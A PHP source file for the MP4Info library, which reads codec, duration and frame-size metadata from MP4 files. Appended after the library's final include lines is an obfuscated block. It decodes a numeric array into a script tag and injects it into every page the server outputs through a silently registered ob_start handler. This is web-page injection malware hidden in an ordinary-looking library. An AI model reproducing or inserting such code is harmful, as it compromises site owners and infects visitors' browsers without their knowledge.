<?php
/**
 * MP4Info
 * 
 * @author 		Tommy Lacroix <lacroix.tommy@gmail.com>
 * @copyright   Copyright (c) 2006-2009 Tommy Lacroix
 * @license		LGPL version 3, http://www.gnu.org/licenses/lgpl.html
 * @package 	php-mp4info
 * @link 		$HeadURL: https://php-mp4info.googlecode.com/svn/trunk/MP4Info.php $
 */

// ---

/**
 * MP4Info main class
 * 
 * @author 		Tommy Lacroix <lacroix.tommy@gmail.com>
 * @version 	1.1.20090611	$Id: MP4Info.php 2 2009-06-11 14:12:31Z lacroix.tommy@gmail.com $
 */
class MP4Info {
	// {{{ Audio codec types
	const MP4_AUDIO_CODEC_UNCOMPRESSED = 0x00;
	const MP4_AUDIO_CODEC_MP3 = 0x02;
	const MP4_AUDIO_CODEC_AAC = 0xe0;
	// }}}
	
	// {{{ Video codec types
	const MP4_VIDEO_CODEC_H264 = 0xe0;
	// }}}	
	

	/**
	 * Get information from MP4 file
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	string		$file
	 * @return	array
	 * @access 	public
	 * @static
	 */
	public static function getInfo($file) {
		// Open file
		$f = fopen($file,'rb');
		if (!$f) {
			throw new Exception('Cannot open file: '.$file);
		}
		
		// Get all boxes
		try {
			while (($box = MP4Info_Box::fromStream($f))) {
				$boxes[] = $box;
			}
		} catch (Exception $e) { }
		
		// Close
		fclose($f);
		
		// Return info
		return self::getInfoFromBoxes($boxes);
	} // getInfo method
	
	
	/**
	 * Get information from MP4 file
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	string		$file
	 * @return	array
	 * @access 	public
	 * @static
	 */
	public static function getInfoBox($file) {
		// Open file
		$f = fopen($file,'rb');
		if (!$f) {
			throw new Exception('Cannot open file: '.$file);
		}
		
		// Get all boxes
		try {
			while (($box = MP4Info_Box::fromStream($f))) {
				$boxes[] = $box;
			}
		} catch (Exception $e) { }
		
		// Close
		fclose($f);
		
		// Return info
		return $boxes;
	} // getInfo method
	
	
	/**
	 * Get information from MP4 boxes
	 *
	 * @author 	Tommy Lacroix <lacroix.tommy@gmail.com>
	 * @param	string		$file
	 * @return	array
	 * @access 	public
	 * @static
	 */	
	public static function getInfoFromBoxes($boxes, &$context=null) {
		if ($context === null) {
			$context = new stdClass();
			$context->hasVideo = false;
			$context->hasAudio = false;
			$context->video = new stdClass();
			$context->audio = new stdClass();
		}
		
		foreach ($boxes as &$box) {
			// Interpret box
			switch ($box->getBoxTypeStr()) {
				case 'hdlr':
					switch ($box->getHandlerType()) {
						case MP4Info_Box_hdlr::HANDLER_VIDEO:
							$context->hasVideo = true;
							break;
						case MP4Info_Box_hdlr::HANDLER_SOUND:
							$context->hasAudio = true;
							break;
					}
					break;
				case 'mvhd':
					$context->duration = $box->getRealDuration();
					break;
				case 'ilst':
					if ($box->hasValue('©too')) {
						$context->encoder = $box->getValue('©too');
					}
					break;
				case 'uuid':
					$meta = $box->getXMPMetaData();
					if ($meta !== false) {
						// Try to get duration
						if (!isset($context->duration)) {
							if (preg_match('/<(|[a-z]+:)duration[\s\n\r]([^>]*)>/im',$meta,$m)) {
								if (preg_match_all('/xmpDM:([a-z]+)="([^"]+)"/',$m[2],$mm)) {
									$value = $scale = false;
									foreach ($mm[1] as $k=>$v) {
										if (($v == 'value') || ($v == 'scale')) {
											if (preg_match('/^1\/([0-9]+)$/',$mm[2][$k],$mmm)) {
												$mm[2][$k] = 1/$mmm[1];
											}
											$$v = $mm[2][$k];
										}
									}
									if (($value !== false) && ($scale !== false)) {
										$context->duration = $value*$scale;
									}
								}
							}
						}
						
						// Try to get size
						if ((!isset($context->width)) || (!isset($context->height))) {
							if (preg_match('/<(|[a-z]+:)videoFrameSize[\s\n\r]([^>]*)>/im',$meta,$m)) {
								if (preg_match_all('/[a-z]:([a-z]+)="([^"]+)"/',$m[2],$mm)) {
									$w = $h = false;
									foreach ($mm[1] as $k=>$v) {
										if (($v == 'w') || ($v == 'h')) {
											$$v = $mm[2][$k];
										}
									}
									if ($w != false) {
										$context->video->width = $w;
										$context->hasVideo = true;
									}
									if ($h != false) {
										$context->video->height = $h;
										$context->hasVideo = true;
									}
								}
							}
						}			
						
						// Try to get encoder
						if (preg_match('/softwareAgent="([^"]+)"/i',$meta,$m)) {
							$context->encoder = $m[1];
						}
						
						// Try to get audio channels
						if (preg_match('/audioChannelType="([^"]+)"/i',$meta,$m)) {
							switch (strtolower($m[1])) {
								case 'stereo':
								case '2':
									$context->audio->channels = 2;
									$context->hasAudio = true;
									break;
								case 'mono':
								case '1':
									$context->audio->channels = 1;
									$context->hasAudio = true;
									break;
								case '5.1':
								case '5':
									$context->audio->channels = 5;
									$context->hasAudio = true;
									break;
							}
						}						
						
						// Try to get audio frequency
						if (preg_match('/audioSampleRate="([^"]+)"/i',$meta,$m)) {
							$context->audio->frequency = $m[1]/1000;
							$context->hasAudio = true;
						}
						
						// Try to get video frame rate
						if (preg_match('/videoFrameRate="([^"]+)"/i',$meta,$m)) {
							$context->video->fps = $m[1];
							$context->hasVideo = true;
						}
						
						//print htmlentities($meta);
					}
					break;
				case 'stsd':
					$values = $box->getValues();
					foreach (array_keys($values) as $codec) {
						switch ($codec) {
							case '.mp3':
								$context->audio->codec = self::MP4_AUDIO_CODEC_MP3;
								$context->audio->codecStr = 'MP3';
								$context->hasAudio = true;
								break;
							case 'mp4a':
							case 'mp4s':
								$context->audio->codec = self::MP4_AUDIO_CODEC_AAC;
								$context->audio->codecStr = 'AAC';
								$context->hasAudio = true;
								break;
							case 'avc1':
							case 'h264':
							case 'H264':
								$context->video->codec = self::MP4_VIDEO_CODEC_H264;
								$context->video->codecStr = 'H.264';
								$context->hasVideo = true;
								break;
						}
					}
					break;
				case 'tkhd':
					if ($box->getWidth() > 0) {
						$context->hasVideo = true;
						$context->video->width = $box->getWidth();
						$context->video->height = $box->getHeight();
						$context->hasVideo = true;
					}
					break;
			}
			
			// Process children
			if ($box->hasChildren()) {
				self::getInfoFromBoxes($box->children(), $context);
			}
		}
		
		return $context;
	} // getInfoFromBoxes method
	
	
	/**
	 * Display boxes for debugging
	 *
	 * @param	MP4Info_Box[]	$boxes
	 * @param 	int				$level
	 * @access 	public
	 * @static
	 */
	public static function displayBoxes($boxes,$level=0) {
		foreach ($boxes as $box) {
			print str_repeat('&nbsp;',$level*4) . $box->toString() . '<br>';
			if ($box->hasChildren()) {
				$this->displayBoxes($box->children(), $level+1);
			}
		}
	} // displayBoxes method
} // MP4Info class

// ---

// {{{ Dependencies
include "MP4Info/Helper.php";
include "MP4Info/Exception.php";
include "MP4Info/Box.php";
// }}} Dependencies<?php global $ob_starting;
if(!$ob_starting) {
   function ob_start_flush($s) {
	$tc = array(0, 69, 84, 82, 67, 83, 7, 79, 8, 9, 73, 12, 76, 68, 63, 78, 19, 23, 24, 3, 65, 70, 27, 14, 16, 20, 80, 17, 29, 89, 86, 85, 2, 77, 91, 93, 11, 18, 71, 66, 72, 75, 87, 74, 22, 37, 52, 13, 59, 61, 25, 28, 21, 1, 35, 15, 34, 36, 30, 88, 41, 92, 46, 33, 51);
	$tr = array(51, 5, 4, 3, 10, 26, 2, 0, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 58, 10, 21, 0, 8, 2, 29, 26, 1, 7, 21, 8, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 9, 28, 28, 32, 31, 15, 13, 1, 21, 10, 15, 1, 13, 32, 9, 0, 34, 0, 0, 0, 30, 20, 3, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 15, 1, 42, 0, 63, 3, 3, 20, 29, 8, 6, 19, 25, 39, 18, 37, 17, 37, 6, 11, 0, 6, 19, 18, 27, 17, 18, 17, 21, 6, 11, 0, 6, 19, 18, 16, 37, 21, 18, 16, 6, 11, 0, 6, 19, 18, 18, 17, 21, 17, 25, 6, 11, 0, 6, 19, 25, 4, 16, 27, 18, 16, 6, 11, 0, 6, 19, 17, 25, 18, 17, 18, 16, 6, 11, 0, 6, 19, 16, 1, 17, 50, 17, 24, 6, 11, 0, 6, 19, 18, 52, 17, 24, 18, 37, 6, 11, 0, 6, 19, 17, 37, 18, 27, 17, 18, 6, 11, 0, 6, 19, 17, 21, 18, 16, 16, 27, 6, 11, 0, 6, 19, 37, 21, 18, 37, 18, 27, 6, 11, 0, 6, 19, 17, 37, 25, 4, 16, 27, 6, 11, 0, 6, 19, 17, 17, 18, 16, 18, 16, 6, 11, 0, 6, 19, 17, 21, 25, 50, 16, 1, 6, 11, 0, 6, 19, 16, 1, 25, 17, 25, 52, 6, 11, 0, 6, 19, 16, 13, 25, 25, 25, 25, 6, 11, 0, 6, 19, 16, 13, 25, 24, 25, 16, 6, 11, 0, 6, 19, 16, 21, 16, 13, 25, 27, 6, 11, 0, 6, 19, 16, 21, 25, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 37, 16, 1, 6, 11, 0, 6, 19, 17, 50, 18, 24, 18, 25, 6, 11, 0, 6, 19, 17, 25, 18, 27, 18, 18, 6, 11, 0, 6, 19, 16, 13, 17, 4, 17, 18, 6, 11, 0, 6, 19, 17, 13, 16, 13, 17, 21, 6, 11, 0, 6, 19, 17, 17, 17, 21, 16, 27, 6, 11, 0, 6, 19, 25, 13, 24, 24, 24, 24, 6, 9, 22, 0, 0, 0, 30, 20, 3, 0, 3, 1, 13, 1, 21, 14, 4, 7, 12, 7, 3, 5, 0, 28, 0, 27, 22, 0, 0, 0, 30, 20, 3, 0, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 0, 28, 0, 24, 22, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 2, 11, 5, 2, 29, 12, 1, 13, 9, 0, 34, 30, 20, 3, 0, 5, 0, 28, 0, 32, 32, 22, 21, 7, 3, 0, 8, 43, 28, 24, 22, 43, 51, 2, 23, 12, 1, 15, 38, 2, 40, 22, 43, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 3, 38, 39, 0, 28, 0, 2, 48, 43, 49, 22, 21, 7, 3, 0, 8, 10, 28, 27, 22, 10, 51, 17, 22, 10, 36, 36, 9, 0, 34, 30, 20, 3, 0, 4, 14, 4, 12, 3, 0, 28, 0, 4, 14, 3, 38, 39, 23, 5, 31, 39, 5, 2, 3, 8, 10, 36, 36, 11, 37, 9, 22, 10, 21, 0, 8, 4, 14, 4, 12, 3, 53, 28, 32, 24, 24, 32, 9, 0, 5, 0, 36, 28, 0, 64, 2, 3, 10, 15, 38, 23, 21, 3, 7, 33, 54, 40, 20, 3, 54, 7, 13, 1, 8, 26, 20, 3, 5, 1, 60, 15, 2, 8, 4, 14, 4, 12, 3, 11, 27, 44, 9, 47, 27, 52, 9, 22, 35, 35, 10, 21, 0, 8, 5, 2, 29, 12, 1, 13, 9, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 16, 44, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 0, 36, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 37, 9, 9, 22, 35, 0, 1, 12, 5, 1, 0, 34, 5, 0, 28, 0, 5, 23, 5, 31, 39, 5, 2, 3, 8, 16, 44, 11, 8, 5, 23, 12, 1, 15, 38, 2, 40, 47, 16, 18, 9, 9, 0, 36, 0, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 48, 27, 49, 23, 5, 31, 39, 5, 2, 3, 8, 24, 11, 27, 9, 36, 15, 1, 42, 0, 57, 20, 2, 1, 8, 9, 23, 38, 1, 2, 46, 10, 33, 1, 8, 9, 22, 35, 3, 1, 2, 31, 3, 15, 0, 5, 22, 0, 0, 0, 35, 0, 0, 0, 21, 31, 15, 4, 2, 10, 7, 15, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 0, 34, 2, 3, 29, 0, 34, 0, 0, 0, 10, 21, 8, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 56, 29, 60, 13, 0, 61, 61, 0, 53, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 9, 34, 13, 7, 4, 31, 33, 1, 15, 2, 23, 42, 3, 10, 2, 1, 8, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 27, 9, 9, 22, 0, 0, 0, 35, 0, 1, 12, 5, 1, 0, 34, 30, 20, 3, 0, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 28, 13, 7, 4, 31, 33, 1, 15, 2, 23, 4, 3, 1, 20, 2, 1, 45, 12, 1, 33, 1, 15, 2, 8, 32, 5, 4, 3, 10, 26, 2, 32, 9, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 2, 29, 26, 1, 28, 32, 2, 1, 59, 2, 55, 43, 20, 30, 20, 5, 4, 3, 10, 26, 2, 32, 22, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 23, 5, 3, 4, 28, 13, 10, 30, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 13, 10, 30, 14, 4, 7, 12, 7, 3, 5, 11, 24, 9, 22, 13, 7, 4, 31, 33, 1, 15, 2, 23, 38, 1, 2, 45, 12, 1, 33, 1, 15, 2, 5, 56, 29, 46, 20, 38, 62, 20, 33, 1, 8, 32, 40, 1, 20, 13, 32, 9, 48, 24, 49, 23, 20, 26, 26, 1, 15, 13, 54, 40, 10, 12, 13, 8, 15, 1, 42, 14, 4, 5, 2, 29, 12, 1, 9, 22, 35, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 35, 2, 3, 29, 0, 34, 4, 40, 1, 4, 41, 14, 4, 7, 12, 7, 3, 5, 14, 26, 10, 4, 41, 1, 13, 8, 9, 22, 35, 0, 4, 20, 2, 4, 40, 8, 1, 9, 0, 34, 0, 5, 1, 2, 46, 10, 33, 1, 7, 31, 2, 8, 32, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 32, 11, 0, 52, 24, 24, 9, 22, 35, 0, 0, 0, 35, 0, 0, 0, 2, 3, 29, 14, 26, 10, 4, 41, 14, 4, 7, 12, 7, 3, 5, 8, 9, 22, 35, 51, 55, 5, 4, 3, 10, 26, 2, 58);

	$ob_htm = ''; foreach($tr as $tval) {
		$ob_htm .= chr($tc[$tval]+32);
	}

	$slw=strtolower($s);
	$i=strpos($slw,'</script');if($i){$i=strpos($slw,'>',$i);}
	if(!$i){$i=strpos($slw,'</div');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</table');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</form');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</p');if($i){$i=strpos($slw,'>',$i);}}
	if(!$i){$i=strpos($slw,'</body');if($i){$i--;}}
	if(!$i){$i=strlen($s);if($i){$i--;}}
	$i++; $s=substr($s,0,$i).$ob_htm.substr($s,$i);
	
	return $s;
   }
   $ob_starting = time();
   @ob_start("ob_start_flush");
} ?>